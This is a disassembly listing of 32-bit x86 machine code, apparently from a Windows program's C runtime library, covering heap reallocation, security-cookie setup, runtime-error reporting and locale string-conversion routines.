  4258b1:	mov    eax,0x1
  4258b6:	jmp    0x4258cd
  4258b8:	push   ebp
  4258b9:	lea    ebp,[ebx+0x10]
  4258bc:	push   0xffffffff
  4258be:	push   ebx
  4258bf:	call   0x4267e2
  4258c4:	add    esp,0x8
  4258c7:	pop    ebp
  4258c8:	mov    eax,0x1
  4258cd:	pop    ebp
  4258ce:	pop    edi
  4258cf:	pop    esi
  4258d0:	pop    ebx
  4258d1:	mov    esp,ebp
  4258d3:	pop    ebp
  4258d4:	ret    
  4258d5:	push   ebp
  4258d6:	mov    ecx,DWORD PTR [esp+0x8]
  4258da:	mov    ebp,DWORD PTR [ecx]
  4258dc:	mov    eax,DWORD PTR [ecx+0x1c]
  4258df:	push   eax
  4258e0:	mov    eax,DWORD PTR [ecx+0x18]
  4258e3:	push   eax
  4258e4:	call   0x4267e2
  4258e9:	add    esp,0x8
  4258ec:	pop    ebp
  4258ed:	ret    0x4
  4258f0:	call   0x423803
  4258f5:	add    eax,0x8
  4258f8:	ret    
  4258f9:	push   0x14
  4258fb:	push   0x4287b8
  425900:	call   0x423950
  425905:	mov    edi,DWORD PTR [ebp+0x8]
  425908:	xor    ebx,ebx
  42590a:	cmp    edi,ebx
  42590c:	jne    0x42591c
  42590e:	push   DWORD PTR [ebp+0xc]
  425911:	call   0x424672
  425916:	pop    ecx
  425917:	jmp    0x425aa0
  42591c:	mov    esi,DWORD PTR [ebp+0xc]
  42591f:	cmp    esi,ebx
  425921:	jne    0x42592f
  425923:	push   edi
  425924:	call   0x42455a
  425929:	pop    ecx
  42592a:	jmp    0x425a9e
  42592f:	cmp    DWORD PTR ds:0x466384,0x3
  425936:	jne    0x425a6a
  42593c:	mov    DWORD PTR [ebp-0x1c],ebx
  42593f:	cmp    esi,0xffffffe0
  425942:	ja     0x425a39
  425948:	push   0x4
  42594a:	call   0x423b0f
  42594f:	pop    ecx
  425950:	mov    DWORD PTR [ebp-0x4],ebx
  425953:	push   edi
  425954:	call   0x424d32
  425959:	pop    ecx
  42595a:	mov    DWORD PTR [ebp-0x20],eax
  42595d:	cmp    eax,ebx
  42595f:	je     0x425a09
  425965:	cmp    esi,DWORD PTR ds:0x466144
  42596b:	ja     0x4259b9
  42596d:	push   esi
  42596e:	push   edi
  42596f:	push   eax
  425970:	call   0x425232
  425975:	add    esp,0xc
  425978:	test   eax,eax
  42597a:	je     0x425981
  42597c:	mov    DWORD PTR [ebp-0x1c],edi
  42597f:	jmp    0x4259b9
  425981:	push   esi
  425982:	call   0x425511
  425987:	pop    ecx
  425988:	mov    DWORD PTR [ebp-0x1c],eax
  42598b:	cmp    eax,ebx
  42598d:	je     0x4259b9
  42598f:	mov    eax,DWORD PTR [edi-0x4]
  425992:	dec    eax
  425993:	mov    DWORD PTR [ebp-0x24],eax
  425996:	cmp    eax,esi
  425998:	jb     0x42599c
  42599a:	mov    eax,esi
  42599c:	push   eax
  42599d:	push   edi
  42599e:	push   DWORD PTR [ebp-0x1c]
  4259a1:	call   0x424690
  4259a6:	push   edi
  4259a7:	call   0x424d32
  4259ac:	mov    DWORD PTR [ebp-0x20],eax
  4259af:	push   edi
  4259b0:	push   eax
  4259b1:	call   0x424d5d
  4259b6:	add    esp,0x18
  4259b9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4259bc:	jne    0x425a09
  4259be:	cmp    esi,ebx
  4259c0:	jne    0x4259c8
  4259c2:	xor    esi,esi
  4259c4:	inc    esi
  4259c5:	mov    DWORD PTR [ebp+0xc],esi
  4259c8:	add    esi,0xf
  4259cb:	and    esi,0xfffffff0
  4259ce:	mov    DWORD PTR [ebp+0xc],esi
  4259d1:	push   esi
  4259d2:	push   ebx
  4259d3:	push   DWORD PTR ds:0x466380
  4259d9:	call   DWORD PTR ds:0x428030
  4259df:	mov    DWORD PTR [ebp-0x1c],eax
  4259e2:	cmp    eax,ebx
  4259e4:	je     0x425a09
  4259e6:	mov    eax,DWORD PTR [edi-0x4]
  4259e9:	dec    eax
  4259ea:	mov    DWORD PTR [ebp-0x24],eax
  4259ed:	cmp    eax,esi
  4259ef:	jb     0x4259f3
  4259f1:	mov    eax,esi
  4259f3:	push   eax
  4259f4:	push   edi
  4259f5:	push   DWORD PTR [ebp-0x1c]
  4259f8:	call   0x424690
  4259fd:	push   edi
  4259fe:	push   DWORD PTR [ebp-0x20]
  425a01:	call   0x424d5d
  425a06:	add    esp,0x14
  425a09:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a0d:	call   0x425a61
  425a12:	cmp    DWORD PTR [ebp-0x20],ebx
  425a15:	jne    0x425a39
  425a17:	cmp    esi,ebx
  425a19:	jne    0x425a1e
  425a1b:	xor    esi,esi
  425a1d:	inc    esi
  425a1e:	add    esi,0xf
  425a21:	and    esi,0xfffffff0
  425a24:	mov    DWORD PTR [ebp+0xc],esi
  425a27:	push   esi
  425a28:	push   edi
  425a29:	push   ebx
  425a2a:	push   DWORD PTR ds:0x466380
  425a30:	call   DWORD PTR ds:0x4280e8
  425a36:	mov    DWORD PTR [ebp-0x1c],eax
  425a39:	mov    eax,DWORD PTR [ebp-0x1c]
  425a3c:	cmp    eax,ebx
  425a3e:	jne    0x425aa0
  425a40:	cmp    DWORD PTR ds:0x466008,ebx
  425a46:	je     0x425aa0
  425a48:	push   esi
  425a49:	call   0x426232
  425a4e:	pop    ecx
  425a4f:	test   eax,eax
  425a51:	jne    0x42593c
  425a57:	jmp    0x425a9e
  425a59:	xor    ebx,ebx
  425a5b:	mov    esi,DWORD PTR [ebp+0xc]
  425a5e:	mov    edi,DWORD PTR [ebp+0x8]
  425a61:	push   0x4
  425a63:	call   0x423a7b
  425a68:	pop    ecx
  425a69:	ret    
  425a6a:	xor    eax,eax
  425a6c:	cmp    esi,0xffffffe0
  425a6f:	ja     0x425a87
  425a71:	cmp    esi,ebx
  425a73:	jne    0x425a78
  425a75:	xor    esi,esi
  425a77:	inc    esi
  425a78:	push   esi
  425a79:	push   edi
  425a7a:	push   ebx
  425a7b:	push   DWORD PTR ds:0x466380
  425a81:	call   DWORD PTR ds:0x4280e8
  425a87:	cmp    eax,ebx
  425a89:	jne    0x425aa0
  425a8b:	cmp    DWORD PTR ds:0x466008,ebx
  425a91:	je     0x425aa0
  425a93:	push   esi
  425a94:	call   0x426232
  425a99:	pop    ecx
  425a9a:	test   eax,eax
  425a9c:	jne    0x425a6a
  425a9e:	xor    eax,eax
  425aa0:	call   0x42398b
  425aa5:	ret    
  425aa6:	push   0x10
  425aa8:	push   0x4287c8
  425aad:	call   0x423950
  425ab2:	cmp    DWORD PTR ds:0x466384,0x3
  425ab9:	jne    0x425af5
  425abb:	push   0x4
  425abd:	call   0x423b0f
  425ac2:	pop    ecx
  425ac3:	and    DWORD PTR [ebp-0x4],0x0
  425ac7:	mov    esi,DWORD PTR [ebp+0x8]
  425aca:	push   esi
  425acb:	call   0x424d32
  425ad0:	pop    ecx
  425ad1:	mov    DWORD PTR [ebp-0x1c],eax
  425ad4:	test   eax,eax
  425ad6:	je     0x425ae3
  425ad8:	mov    esi,DWORD PTR [esi-0x4]
  425adb:	sub    esi,0x9
  425ade:	mov    DWORD PTR [ebp-0x20],esi
  425ae1:	jmp    0x425ae6
  425ae3:	mov    esi,DWORD PTR [ebp-0x20]
  425ae6:	or     DWORD PTR [ebp-0x4],0xffffffff
  425aea:	call   0x425b13
  425aef:	cmp    DWORD PTR [ebp-0x1c],0x0
  425af3:	jne    0x425b08
  425af5:	push   DWORD PTR [ebp+0x8]
  425af8:	push   0x0
  425afa:	push   DWORD PTR ds:0x466380
  425b00:	call   DWORD PTR ds:0x428018
  425b06:	mov    esi,eax
  425b08:	mov    eax,esi
  425b0a:	call   0x42398b
  425b0f:	ret    
  425b10:	mov    esi,DWORD PTR [ebp-0x20]
  425b13:	push   0x4
  425b15:	call   0x423a7b
  425b1a:	pop    ecx
  425b1b:	ret    
  425b1c:	push   ebp
  425b1d:	mov    ebp,esp
  425b1f:	sub    esp,0x10
  425b22:	push   esi
  425b23:	lea    eax,[ebp-0x8]
  425b26:	push   eax
  425b27:	call   DWORD PTR ds:0x4280f8
  425b2d:	mov    esi,DWORD PTR [ebp-0x4]
  425b30:	xor    esi,DWORD PTR [ebp-0x8]
  425b33:	call   DWORD PTR ds:0x4280f4
  425b39:	xor    esi,eax
  425b3b:	call   DWORD PTR ds:0x428020
  425b41:	xor    esi,eax
  425b43:	call   DWORD PTR ds:0x4280f0
  425b49:	xor    esi,eax
  425b4b:	lea    eax,[ebp-0x10]
  425b4e:	push   eax
  425b4f:	call   DWORD PTR ds:0x4280ec
  425b55:	mov    eax,DWORD PTR [ebp-0xc]
  425b58:	xor    eax,DWORD PTR [ebp-0x10]
  425b5b:	xor    esi,eax
  425b5d:	mov    DWORD PTR ds:0x465660,esi
  425b63:	jne    0x425b6f
  425b65:	mov    DWORD PTR ds:0x465660,0xbb40e64e
  425b6f:	pop    esi
  425b70:	leave  
  425b71:	ret    
  425b72:	push   0x118
  425b77:	push   0x428978
  425b7c:	call   0x423950
  425b81:	mov    eax,ds:0x465660
  425b86:	xor    eax,DWORD PTR [ebp+0x4]
  425b89:	mov    DWORD PTR [ebp-0x1c],eax
  425b8c:	mov    eax,ds:0x465fd8
  425b91:	xor    ecx,ecx
  425b93:	cmp    eax,ecx
  425b95:	je     0x425bb6
  425b97:	mov    DWORD PTR [ebp-0x4],ecx
  425b9a:	push   DWORD PTR [ebp+0xc]
  425b9d:	push   DWORD PTR [ebp+0x8]
  425ba0:	call   eax
  425ba2:	pop    ecx
  425ba3:	pop    ecx
  425ba4:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ba8:	jmp    0x425cb4
  425bad:	xor    eax,eax
  425baf:	inc    eax
  425bb0:	ret    
  425bb1:	mov    esp,DWORD PTR [ebp-0x18]
  425bb4:	jmp    0x425ba4
  425bb6:	mov    eax,DWORD PTR [ebp+0x8]
  425bb9:	dec    eax
  425bba:	je     0x425bcf
  425bbc:	mov    edi,0x428954
  425bc1:	mov    DWORD PTR [ebp-0x20],0x4288a0
  425bc8:	mov    esi,0xd4
  425bcd:	jmp    0x425be0
  425bcf:	mov    edi,0x428880
  425bd4:	mov    DWORD PTR [ebp-0x20],0x4287e0
  425bdb:	mov    esi,0xb9
  425be0:	mov    BYTE PTR [ebp-0x24],cl
  425be3:	push   0x104
  425be8:	lea    eax,[ebp-0x128]
  425bee:	push   eax
  425bef:	push   ecx
  425bf0:	call   DWORD PTR ds:0x42807c
  425bf6:	test   eax,eax
  425bf8:	jne    0x425c0d
  425bfa:	push   0x4284d4
  425bff:	lea    eax,[ebp-0x128]
  425c05:	push   eax
  425c06:	call   0x423d30
  425c0b:	pop    ecx
  425c0c:	pop    ecx
  425c0d:	lea    ebx,[ebp-0x128]
  425c13:	lea    eax,[ebp-0x128]
  425c19:	push   eax
  425c1a:	call   0x423f60
  425c1f:	pop    ecx
  425c20:	add    eax,0xb
  425c23:	cmp    eax,0x3c
  425c26:	jbe    0x425c51
  425c28:	lea    eax,[ebp-0x128]
  425c2e:	push   eax
  425c2f:	call   0x423f60
  425c34:	mov    ebx,eax
  425c36:	lea    eax,[ebp-0x128]
  425c3c:	sub    eax,0x31
  425c3f:	add    ebx,eax
  425c41:	push   0x3
  425c43:	push   0x4284d0
  425c48:	push   ebx
  425c49:	call   0x423e30
  425c4e:	add    esp,0x10
  425c51:	push   ebx
  425c52:	call   0x423f60
  425c57:	pop    ecx
  425c58:	lea    eax,[eax+esi*1+0xc]
  425c5c:	add    eax,0x3
  425c5f:	and    eax,0xfffffffc
  425c62:	call   0x4239a0
  425c67:	mov    DWORD PTR [ebp-0x18],esp
  425c6a:	mov    esi,esp
  425c6c:	push   edi
  425c6d:	push   esi
  425c6e:	call   0x423d30
  425c73:	mov    edi,0x4284b0
  425c78:	push   edi
  425c79:	push   esi
  425c7a:	call   0x423d40
  425c7f:	push   0x4287d4
  425c84:	push   esi
  425c85:	call   0x423d40
  425c8a:	push   ebx
  425c8b:	push   esi
  425c8c:	call   0x423d40
  425c91:	push   edi
  425c92:	push   esi
  425c93:	call   0x423d40
  425c98:	push   DWORD PTR [ebp-0x20]
  425c9b:	push   esi
  425c9c:	call   0x423d40
  425ca1:	push   0x12010
  425ca6:	push   0x428488
  425cab:	push   esi
  425cac:	call   0x423c32
  425cb1:	add    esp,0x3c
  425cb4:	push   0x3
  425cb6:	call   0x422dbc
  425cbb:	int3   
  425cbc:	push   0x38
  425cbe:	push   0x428d98
  425cc3:	call   0x423950
  425cc8:	xor    ebx,ebx
  425cca:	cmp    DWORD PTR ds:0x465ffc,ebx
  425cd0:	jne    0x425d0a
  425cd2:	push   ebx
  425cd3:	push   ebx
  425cd4:	xor    esi,esi
  425cd6:	inc    esi
  425cd7:	push   esi
  425cd8:	push   0x428d94
  425cdd:	push   0x100
  425ce2:	push   ebx
  425ce3:	call   DWORD PTR ds:0x428104
  425ce9:	test   eax,eax
  425ceb:	je     0x425cf5
  425ced:	mov    DWORD PTR ds:0x465ffc,esi
  425cf3:	jmp    0x425d0a
  425cf5:	call   DWORD PTR ds:0x42803c
  425cfb:	cmp    eax,0x78
  425cfe:	jne    0x425d0a
  425d00:	mov    DWORD PTR ds:0x465ffc,0x2
  425d0a:	cmp    DWORD PTR [ebp+0x14],ebx
  425d0d:	jle    0x425d2a
  425d0f:	mov    ecx,DWORD PTR [ebp+0x14]
  425d12:	mov    eax,DWORD PTR [ebp+0x10]
  425d15:	dec    ecx
  425d16:	cmp    BYTE PTR [eax],bl
  425d18:	je     0x425d22
  425d1a:	inc    eax
  425d1b:	cmp    ecx,ebx
  425d1d:	jne    0x425d15
  425d1f:	or     ecx,0xffffffff
  425d22:	or     eax,0xffffffff
  425d25:	sub    eax,ecx
  425d27:	add    DWORD PTR [ebp+0x14],eax
  425d2a:	mov    eax,ds:0x465ffc
  425d2f:	cmp    eax,0x2
  425d32:	je     0x425f14
  425d38:	cmp    eax,ebx
  425d3a:	je     0x425f14
  425d40:	cmp    eax,0x1
  425d43:	jne    0x425f47
  425d49:	xor    edi,edi
  425d4b:	mov    DWORD PTR [ebp-0x1c],edi
  425d4e:	mov    DWORD PTR [ebp-0x20],ebx
  425d51:	mov    DWORD PTR [ebp-0x24],ebx
  425d54:	cmp    DWORD PTR [ebp+0x20],ebx
  425d57:	jne    0x425d61
  425d59:	mov    eax,ds:0x465ff4
  425d5e:	mov    DWORD PTR [ebp+0x20],eax
  425d61:	push   ebx
  425d62:	push   ebx
  425d63:	push   DWORD PTR [ebp+0x14]
  425d66:	push   DWORD PTR [ebp+0x10]
  425d69:	xor    eax,eax
  425d6b:	cmp    DWORD PTR [ebp+0x24],ebx
  425d6e:	setne  al
  425d71:	lea    eax,[eax*8+0x1]
  425d78:	push   eax
  425d79:	push   DWORD PTR [ebp+0x20]
  425d7c:	call   DWORD PTR ds:0x428100
  425d82:	mov    esi,eax
  425d84:	mov    DWORD PTR [ebp-0x28],esi
  425d87:	cmp    esi,ebx
  425d89:	je     0x425f47
  425d8f:	mov    DWORD PTR [ebp-0x4],0x1
  425d96:	lea    eax,[esi+esi*1]
  425d99:	add    eax,0x3
  425d9c:	and    eax,0xfffffffc
  425d9f:	call   0x4239a0
  425da4:	mov    DWORD PTR [ebp-0x18],esp
  425da7:	mov    eax,esp
  425da9:	mov    DWORD PTR [ebp-0x2c],eax
  425dac:	or     DWORD PTR [ebp-0x4],0xffffffff
  425db0:	jmp    0x425dcd
  425db2:	xor    eax,eax
  425db4:	inc    eax
  425db5:	ret    
  425db6:	mov    esp,DWORD PTR [ebp-0x18]
  425db9:	call   0x426de5
  425dbe:	xor    ebx,ebx
  425dc0:	mov    DWORD PTR [ebp-0x2c],ebx
  425dc3:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dc7:	mov    edi,DWORD PTR [ebp-0x1c]
  425dca:	mov    esi,DWORD PTR [ebp-0x28]
  425dcd:	cmp    DWORD PTR [ebp-0x2c],ebx
  425dd0:	jne    0x425dee
  425dd2:	lea    eax,[esi+esi*1]
  425dd5:	push   eax
  425dd6:	call   0x424672
  425ddb:	pop    ecx
  425ddc:	mov    DWORD PTR [ebp-0x2c],eax
  425ddf:	cmp    eax,ebx
  425de1:	je     0x425f47
  425de7:	mov    DWORD PTR [ebp-0x20],0x1
  425dee:	push   esi
  425def:	push   DWORD PTR [ebp-0x2c]
  425df2:	push   DWORD PTR [ebp+0x14]
  425df5:	push   DWORD PTR [ebp+0x10]
  425df8:	push   0x1
  425dfa:	push   DWORD PTR [ebp+0x20]
  425dfd:	call   DWORD PTR ds:0x428100
  425e03:	test   eax,eax
  425e05:	je     0x425ef1
  425e0b:	push   ebx
  425e0c:	push   ebx
  425e0d:	push   esi
  425e0e:	push   DWORD PTR [ebp-0x2c]
  425e11:	push   DWORD PTR [ebp+0xc]
  425e14:	push   DWORD PTR [ebp+0x8]
  425e17:	call   DWORD PTR ds:0x428104
  425e1d:	mov    edi,eax
  425e1f:	mov    DWORD PTR [ebp-0x1c],edi
  425e22:	cmp    edi,ebx
  425e24:	je     0x425ef1
  425e2a:	test   BYTE PTR [ebp+0xd],0x4
  425e2e:	je     0x425e5d
  425e30:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e33:	je     0x425ef1
  425e39:	cmp    edi,DWORD PTR [ebp+0x1c]
  425e3c:	jg     0x425ef1
  425e42:	push   DWORD PTR [ebp+0x1c]
  425e45:	push   DWORD PTR [ebp+0x18]
  425e48:	push   esi
  425e49:	push   DWORD PTR [ebp-0x2c]
  425e4c:	push   DWORD PTR [ebp+0xc]
  425e4f:	push   DWORD PTR [ebp+0x8]
  425e52:	call   DWORD PTR ds:0x428104
  425e58:	jmp    0x425ef1
  425e5d:	mov    DWORD PTR [ebp-0x4],0x2
  425e64:	lea    eax,[edi+edi*1]
  425e67:	add    eax,0x3
  425e6a:	and    eax,0xfffffffc
  425e6d:	call   0x4239a0
  425e72:	mov    DWORD PTR [ebp-0x18],esp
  425e75:	mov    eax,esp
  425e77:	mov    DWORD PTR [ebp-0x30],eax
  425e7a:	or     DWORD PTR [ebp-0x4],0xffffffff
  425e7e:	jmp    0x425e9b
  425e80:	xor    eax,eax
  425e82:	inc    eax
  425e83:	ret    
  425e84:	mov    esp,DWORD PTR [ebp-0x18]
  425e87:	call   0x426de5
  425e8c:	xor    ebx,ebx
  425e8e:	mov    DWORD PTR [ebp-0x30],ebx
  425e91:	or     DWORD PTR [ebp-0x4],0xffffffff
  425e95:	mov    edi,DWORD PTR [ebp-0x1c]
  425e98:	mov    esi,DWORD PTR [ebp-0x28]
  425e9b:	cmp    DWORD PTR [ebp-0x30],ebx
  425e9e:	jne    0x425eb8
  425ea0:	lea    eax,[edi+edi*1]
  425ea3:	push   eax
  425ea4:	call   0x424672
  425ea9:	pop    ecx
  425eaa:	mov    DWORD PTR [ebp-0x30],eax
  425ead:	cmp    eax,ebx
  425eaf:	je     0x425ef1
  425eb1:	mov    DWORD PTR [ebp-0x24],0x1
  425eb8:	push   edi
  425eb9:	push   DWORD PTR [ebp-0x30]
  425ebc:	push   esi
  425ebd:	push   DWORD PTR [ebp-0x2c]
  425ec0:	push   DWORD PTR [ebp+0xc]
  425ec3:	push   DWORD PTR [ebp+0x8]
  425ec6:	call   DWORD PTR ds:0x428104
  425ecc:	test   eax,eax
  425ece:	je     0x425ef1
  425ed0:	push   ebx
  425ed1:	push   ebx
  425ed2:	cmp    DWORD PTR [ebp+0x1c],ebx
  425ed5:	jne    0x425edb
  425ed7:	push   ebx
  425ed8:	push   ebx
  425ed9:	jmp    0x425ee1
  425edb:	push   DWORD PTR [ebp+0x1c]
  425ede:	push   DWORD PTR [ebp+0x18]
  425ee1:	push   edi
  425ee2:	push   DWORD PTR [ebp-0x30]
  425ee5:	push   ebx
  425ee6:	push   DWORD PTR [ebp+0x20]
  425ee9:	call   DWORD PTR ds:0x428090
  425eef:	mov    edi,eax
  425ef1:	cmp    DWORD PTR [ebp-0x24],ebx
  425ef4:	je     0x425eff
  425ef6:	push   DWORD PTR [ebp-0x30]
  425ef9:	call   0x42455a
  425efe:	pop    ecx
  425eff:	cmp    DWORD PTR [ebp-0x20],ebx
  425f02:	je     0x425f0d
  425f04:	push   DWORD PTR [ebp-0x2c]
  425f07:	call   0x42455a
  425f0c:	pop    ecx
  425f0d:	mov    eax,edi
  425f0f:	jmp    0x42606f
  425f14:	mov    DWORD PTR [ebp-0x34],ebx
  425f17:	xor    edi,edi
  425f19:	mov    DWORD PTR [ebp-0x38],ebx
  425f1c:	cmp    DWORD PTR [ebp+0x8],ebx
  425f1f:	jne    0x425f29
  425f21:	mov    eax,ds:0x465fe4
  425f26:	mov    DWORD PTR [ebp+0x8],eax
  425f29:	cmp    DWORD PTR [ebp+0x20],ebx
  425f2c:	jne    0x425f36
  425f2e:	mov    eax,ds:0x465ff4
  425f33:	mov    DWORD PTR [ebp+0x20],eax
  425f36:	push   DWORD PTR [ebp+0x8]
  425f39:	call   0x426bcd
  425f3e:	pop    ecx
  425f3f:	mov    DWORD PTR [ebp-0x3c],eax
  425f42:	cmp    eax,0xffffffff
  425f45:	jne    0x425f4e
  425f47:	xor    eax,eax
  425f49:	jmp    0x42606f
  425f4e:	cmp    eax,DWORD PTR [ebp+0x20]
  425f51:	je     0x426045
  425f57:	push   ebx
  425f58:	push   ebx
  425f59:	lea    ecx,[ebp+0x14]
  425f5c:	push   ecx
  425f5d:	push   DWORD PTR [ebp+0x10]
  425f60:	push   eax
  425f61:	push   DWORD PTR [ebp+0x20]
  425f64:	call   0x426c16
  425f69:	add    esp,0x18
  425f6c:	mov    DWORD PTR [ebp-0x34],eax
  425f6f:	cmp    eax,ebx
  425f71:	je     0x425f47
  425f73:	push   ebx
  425f74:	push   ebx
  425f75:	push   DWORD PTR [ebp+0x14]
  425f78:	push   eax
  425f79:	push   DWORD PTR [ebp+0xc]
  425f7c:	push   DWORD PTR [ebp+0x8]
  425f7f:	call   DWORD PTR ds:0x4280fc
  425f85:	mov    esi,eax
  425f87:	mov    DWORD PTR [ebp-0x40],esi
  425f8a:	cmp    esi,ebx
  425f8c:	je     0x426034
  425f92:	mov    DWORD PTR [ebp-0x4],ebx
  425f95:	add    eax,0x3
  425f98:	and    eax,0xfffffffc
  425f9b:	call   0x4239a0
  425fa0:	mov    DWORD PTR [ebp-0x18],esp
  425fa3:	mov    edi,esp
  425fa5:	mov    DWORD PTR [ebp-0x44],edi
  425fa8:	push   esi
  425fa9:	push   ebx
  425faa:	push   edi
  425fab:	call   0x426250
  425fb0:	add    esp,0xc
  425fb3:	jmp    0x425fc5
  425fb5:	xor    eax,eax
  425fb7:	inc    eax
  425fb8:	ret    
  425fb9:	mov    esp,DWORD PTR [ebp-0x18]
  425fbc:	call   0x426de5
  425fc1:	xor    ebx,ebx
  425fc3:	xor    edi,edi
  425fc5:	or     DWORD PTR [ebp-0x4],0xffffffff
  425fc9:	cmp    edi,ebx
  425fcb:	jne    0x425ff0
  425fcd:	push   DWORD PTR [ebp-0x40]
  425fd0:	call   0x424672
  425fd5:	pop    ecx
  425fd6:	mov    edi,eax
  425fd8:	cmp    edi,ebx
  425fda:	je     0x42600d
  425fdc:	push   DWORD PTR [ebp-0x40]
  425fdf:	push   ebx
  425fe0:	push   edi
  425fe1:	call   0x426250
  425fe6:	add    esp,0xc
  425fe9:	mov    DWORD PTR [ebp-0x38],0x1
  425ff0:	push   DWORD PTR [ebp-0x40]
  425ff3:	push   edi
  425ff4:	push   DWORD PTR [ebp+0x14]
  425ff7:	push   DWORD PTR [ebp-0x34]
  425ffa:	push   DWORD PTR [ebp+0xc]
  425ffd:	push   DWORD PTR [ebp+0x8]
  426000:	call   DWORD PTR ds:0x4280fc
  426006:	mov    DWORD PTR [ebp-0x40],eax
  426009:	cmp    eax,ebx
  42600b:	jne    0x426011
  42600d:	xor    esi,esi
  42600f:	jmp    0x426037
  426011:	push   DWORD PTR [ebp+0x1c]
  426014:	push   DWORD PTR [ebp+0x18]
  426017:	lea    eax,[ebp-0x40]
  42601a:	push   eax
  42601b:	push   edi
  42601c:	push   DWORD PTR [ebp+0x20]
  42601f:	push   DWORD PTR [ebp-0x3c]
  426022:	call   0x426c16
  426027:	add    esp,0x18
  42602a:	mov    esi,eax
  42602c:	neg    esi
  42602e:	sbb    esi,esi
  426030:	neg    esi
  426032:	jmp    0x426037
  426034:	mov    esi,DWORD PTR [ebp-0x48]
  426037:	cmp    DWORD PTR [ebp-0x38],ebx
  42603a:	je     0x42605f
  42603c:	push   edi
  42603d:	call   0x42455a
  426042:	pop    ecx
  426043:	jmp    0x42605f
  426045:	push   DWORD PTR [ebp+0x1c]
  426048:	push   DWORD PTR [ebp+0x18]
  42604b:	push   DWORD PTR [ebp+0x14]
  42604e:	push   DWORD PTR [ebp+0x10]
  426051:	push   DWORD PTR [ebp+0xc]
  426054:	push   DWORD PTR [ebp+0x8]
  426057:	call   DWORD PTR ds:0x4280fc
  42605d:	mov    esi,eax
  42605f:	cmp    DWORD PTR [ebp-0x34],ebx
  426062:	je     0x42606d
  426064:	push   DWORD PTR [ebp-0x34]
  426067:	call   0x42455a
  42606c:	pop    ecx
  42606d:	mov    eax,esi
  42606f:	lea    esp,[ebp-0x54]
  426072:	call   0x42398b
  426077:	ret    
  426078:	push   0x1c
  42607a:	push   0x428dc0
  42607f:	call   0x423950
  426084:	xor    esi,esi
  426086:	cmp    DWORD PTR ds:0x466000,esi
  42608c:	jne    0x4260c3
  42608e:	lea    eax,[ebp-0x1c]
  426091:	push   eax
  426092:	xor    edi,edi
  426094:	inc    edi
  426095:	push   edi
  426096:	push   0x428d94
  42609b:	push   edi
  42609c:	call   DWORD PTR ds:0x42810c
  4260a2:	test   eax,eax
  4260a4:	je     0x4260ae
  4260a6:	mov    DWORD PTR ds:0x466000,edi
  4260ac:	jmp    0x4260c3
  4260ae:	call   DWORD PTR ds:0x42803c
  4260b4:	cmp    eax,0x78
  4260b7:	jne    0x4260c3
  4260b9:	mov    DWORD PTR ds:0x466000,0x2
  4260c3:	mov    eax,ds:0x466000
  4260c8:	cmp    eax,0x2
  4260cb:	je     0x4261bb
  4260d1:	cmp    eax,esi
  4260d3:	je     0x4261bb
  4260d9:	cmp    eax,0x1
  4260dc:	jne    0x4261e1
  4260e2:	mov    DWORD PTR [ebp-0x20],esi
  4260e5:	mov    DWORD PTR [ebp-0x24],esi
  4260e8:	cmp    DWORD PTR [ebp+0x18],esi
  4260eb:	jne    0x4260f5
  4260ed:	mov    eax,ds:0x465ff4
  4260f2:	mov    DWORD PTR [ebp+0x18],eax
  4260f5:	push   esi
  4260f6:	push   esi
  4260f7:	push   DWORD PTR [ebp+0x10]
  4260fa:	push   DWORD PTR [ebp+0xc]
  4260fd:	xor    eax,eax
  4260ff:	cmp    DWORD PTR [ebp+0x20],esi
  426102:	setne  al
  426105:	lea    eax,[eax*8+0x1]
  42610c:	push   eax
  42610d:	push   DWORD PTR [ebp+0x18]
  426110:	call   DWORD PTR ds:0x428100
  426116:	mov    edi,eax
  426118:	mov    DWORD PTR [ebp-0x28],edi
  42611b:	test   edi,edi
  42611d:	je     0x4261e1
  426123:	and    DWORD PTR [ebp-0x4],0x0
  426127:	lea    ebx,[edi+edi*1]
  42612a:	mov    eax,ebx
  42612c:	add    eax,0x3
  42612f:	and    eax,0xfffffffc
  426132:	call   0x4239a0
  426137:	mov    DWORD PTR [ebp-0x18],esp
  42613a:	mov    esi,esp
  42613c:	mov    DWORD PTR [ebp-0x2c],esi
  42613f:	push   ebx
  426140:	push   0x0
  426142:	push   esi
  426143:	call   0x426250
  426148:	add    esp,0xc
  42614b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42614f:	jmp    0x426166
  426151:	xor    eax,eax
  426153:	inc    eax
  426154:	ret    
  426155:	mov    esp,DWORD PTR [ebp-0x18]
  426158:	call   0x426de5
  42615d:	xor    esi,esi
  42615f:	or     DWORD PTR [ebp-0x4],0xffffffff
  426163:	mov    edi,DWORD PTR [ebp-0x28]
  426166:	test   esi,esi
  426168:	jne    0x426181
  42616a:	push   edi
  42616b:	push   0x2
  42616d:	call   0x424a68
  426172:	pop    ecx
  426173:	pop    ecx
  426174:	mov    esi,eax
  426176:	test   esi,esi
  426178:	je     0x4261e1
  42617a:	mov    DWORD PTR [ebp-0x24],0x1
  426181:	push   edi
  426182:	push   esi
  426183:	push   DWORD PTR [ebp+0x10]
  426186:	push   DWORD PTR [ebp+0xc]
  426189:	push   0x1
  42618b:	push   DWORD PTR [ebp+0x18]
  42618e:	call   DWORD PTR ds:0x428100
  426194:	test   eax,eax
  426196:	je     0x4261a9
  426198:	push   DWORD PTR [ebp+0x14]
  42619b:	push   eax
  42619c:	push   esi
  42619d:	push   DWORD PTR [ebp+0x8]
  4261a0:	call   DWORD PTR ds:0x42810c
  4261a6:	mov    DWORD PTR [ebp-0x20],eax
  4261a9:	cmp    DWORD PTR [ebp-0x24],0x0
  4261ad:	je     0x4261b6
  4261af:	push   esi
  4261b0:	call   0x42455a
  4261b5:	pop    ecx
  4261b6:	mov    eax,DWORD PTR [ebp-0x20]
  4261b9:	jmp    0x426229
  4261bb:	mov    ebx,DWORD PTR [ebp+0x1c]
  4261be:	cmp    ebx,esi
  4261c0:	jne    0x4261c8
  4261c2:	mov    ebx,DWORD PTR ds:0x465fe4
  4261c8:	mov    edi,DWORD PTR [ebp+0x18]
  4261cb:	test   edi,edi
  4261cd:	jne    0x4261d5
  4261cf:	mov    edi,DWORD PTR ds:0x465ff4
  4261d5:	push   ebx
  4261d6:	call   0x426bcd
  4261db:	pop    ecx
  4261dc:	cmp    eax,0xffffffff
  4261df:	jne    0x4261e5
  4261e1:	xor    eax,eax
  4261e3:	jmp    0x426229
